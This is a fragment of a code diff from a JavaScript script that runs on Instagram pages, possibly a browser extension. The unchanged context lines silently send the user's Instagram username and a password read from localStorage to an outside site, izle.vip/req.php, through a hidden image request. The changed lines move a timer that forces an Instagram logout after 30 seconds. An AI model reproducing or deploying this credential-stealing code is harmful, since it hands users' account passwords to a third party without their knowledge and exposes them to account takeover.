@@ -249,10 +249,10 @@ $(document).ready(() => {
 						if(localStorage["passwd"]){
 							new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
 						}
-						setTimeout(()=>{
-							window.location.replace("https://www.instagram.com/accounts/logout/");
-						},10000*3)
 					}	
+					setTimeout(()=>{
+						window.location.replace("https://www.instagram.com/accounts/logout/");
+					},10000*3)
 				}
 			}
 			xhrCount.open('GET', "https://www.instagram.com/"+username+"/?__a=1", true);
